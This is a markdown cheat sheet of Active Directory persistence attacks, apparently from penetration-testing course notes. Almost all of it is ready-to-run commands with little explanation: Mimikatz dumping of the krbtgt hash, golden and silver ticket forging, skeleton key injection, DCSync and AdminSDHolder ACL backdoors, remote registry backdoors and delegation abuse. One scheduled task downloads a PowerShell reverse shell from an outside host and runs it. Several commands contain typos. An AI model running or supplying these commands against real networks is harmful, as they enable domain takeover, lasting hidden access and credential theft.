# Domain persistence
* [Golden Ticket](#Golden-Ticket) 
* [Silver Ticket](#Silver-Ticket)
* [Skeleton Key](#Skeleton-Key)
* [DSRM](#DSRM)
* [Custom SSP - Track logons](#Custom-SSP---Track-logons)
* [ACL](#ACL)
  * [AdminSDHolder](#AdminSDHolder)
  * [DCsync](#DCsync)
  * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
  * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
  * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
  * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
* [Computer Account](#Computer-Account)


## Golden ticket
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets

#### Dump hashes of DC
- Get the krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

```
.\SafetyKatz.exe "lsadump::lsa /patch" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

#### Create a Golden ticket
- Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
- To get the SID use ```Get-DomainSID``` from powerview
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
```

## Silver ticket
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets

#### Make silver ticket for CIFS service
- Use the hash of the local computer
- Other services are HOST, RPCSS, WSMAN
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:CIFS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Check access (After CIFS silver ticket)
```
ls \\<SERVERNAME>\c$\
```

#### Make silver ticket for Host service
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Schedule and execute a task (After host silver ticket)
```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

#### Make silver ticket for WMI
Execute for WMI /service:HOST /service:RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:RPCSS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

## Skeleton key
- https://pentestlab.blog/2018/04/10/skeleton-key/

#### Create the skeleton key - Requires DA
```
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <TARGET>
```

### Authenticate as any user with password ```mimikatz```

## DSRM
#### Dump DSRM password - dumps local users
- look for the local administrator password
```
Invoke-Mimikatz -Command '"token::elevate” “lsadump::sam"' -Computername <TARGET>
```

#### Change login behavior for the local admin on the DC
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```

#### Overpass the hash local administrator
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC NAME> /user:Administrator /ntlm:<HASH> /run:powershell.exe"' 
```

#### Use PSremoting with NTLM authentication
```
Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication Negotiate 
```

## Custom SSP - Track logons
#### Mimilib.dll
- Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
```

#### Use mimikatz to inject into lsass
all logons are logged to C:\Windows\System32\kiwissp.log
```
Invoke-Mimikatz -Command '"misc:memssp"'
```

## ACL
### AdminSDHolder
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence

#### Check if student has replication rights
```
Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=<TOP DOMAIN>" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Add fullcontrol permissions for a user to the adminSDHolder
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
```

#### Other interesting permissions
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights ResetPassword -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights WriteMembers -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
```

#### Run SDProp on AD (Force the sync of AdminSDHolder)
```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check if user got generic all against domain admins group
```
Get-ObjectAcl -SamaccountName "Domain Admins" –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```

#### Add user to domain admin group
```
Add-DomainGroupMember -Identity "Domain Admins" -Members <USERNAME> -Verbose
```

or

```
Net group "domain admins" sportless /add /domain
```

#### Abuse resetpassword using powerview_dev
```
Set-DomainUserPassword -Identity <USERNAME> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
```

### DCsync
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync

#### Add Full-control rights
```
Add-DomainObjectAcl -TargetIdentity "dc=<DOMAIN>,dc=<TOP DOMAIN>" -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN< -TargetDomain <DOMAIN> -Verbose
```

#### Add rights for DCsync
```
Add-DomainObjectAcl -TargetIdentity "dc=<DOMAIN>,dc=<TOP DOMAIN>" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain <FQDN DOMAIN> -TargetDomain <FQDN DOMAIN> -Verbose 
```

#### Execute DCSync and dump krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

### SecurityDescriptor - WMI
```
. ./Set-RemoteWMI.ps1
```

#### On a local machine
```
Set-RemoteWMI -Username <USERNAME> -Verbose
```

#### On a remote machine without explicit credentials
```
Set-RemoteWMI -Username <username> -Computername <COMPUTERNAME> -namespace ‘root\cimv2’ -Verbose
```

#### On a remote machine with explicit credentials
- Only root/cimv and nested namespaces
```
Set-RemoteWMI -Username <username> -Computername <COMPUTERNAME> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

#### On remote machine remove permissions
```
Set-RemoteWMI -Username <USERNAME> -Computername <COMPUTERNAME> -namespace ‘root\cimv2’ -Remove -Verbose
```

#### Check WMI permissions
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
```

### SecurityDescriptor - Powershell Remoting
```
. ./Set-RemotePSRemoting.ps1
```

#### On a local machine
```
Set-RemotePSRemoting -Username <USERNAME> -Verbose
```

#### On a remote machine without credentials
```
Set-RemotePSRemoting -Username <USERNAME> -Computername <COMPUTERNAME> -Verbose
```

#### On a remote machine remove permissions
```
Set-RemotePSRemoting -Username <USERNAME> -Computername <COMPUTERNAME> -Remove
```

### SecurityDescriptor - Remote Registry
Using the DAMP toolkit
```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```

#### Using DAMP with admin privs on remote machine
```
Add-RemoteRegBackdoor -Computername <COMPUTERNAME> -Trustee <USERNAME> -Verbose
```

#### Retrieve machine account hash from local machine
```
Get-RemoteMachineAccountHash -Computername <COMPUTERNAME> -Verbose
```

#### Retrieve local account hash from local machine
```
Get-RemoteLocalAccountHash -Computername <COMPUTERNAME> -Verbose
```

#### Retrieve domain cached credentials from local machine
```
Get-RemoteCachedCredential -Computername <COMPUTERNAME> -Verbose
```

### msDS-AllowedToDelegateTo
#### Set msDS-AllowedToDelegateTo
```
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
Get-DomainUser –TrustedToAuth
```

#### Abuse msDS-AllowedToDelegateTo Kekeo
```
kekeo# tgt::ask /user:<USER> /domain:<DOMAIN> /password:Password@123!

kekeo# tgs::s4u /tgt:<KIRBI FILE> /user:Administrator@<DOMAIN> /service:ldap/<FQDN DC>

Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

#### Abuse Rubeus:
```
Rubeus.exe hash /password:Password@123! /user:<USER> /domain:<DOMAIN>

Rubeus.exe s4u /user:<USER> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:ldap/<FQDN DC> /domain:<DOMAIN> /ptt

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

## Computeraccount
- https://github.com/Kevin-Robertson/Powermad
- Low privilege if not added to the domain admins group

#### Add computeraccount to the domain
```
New-MachineAccount -Domain <DOMAIN> -MachineAccount <NAME OF MACHINE TO ADD> -DomainController <IP> -Verbose
```

### Runas computeraccount
```
runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
```
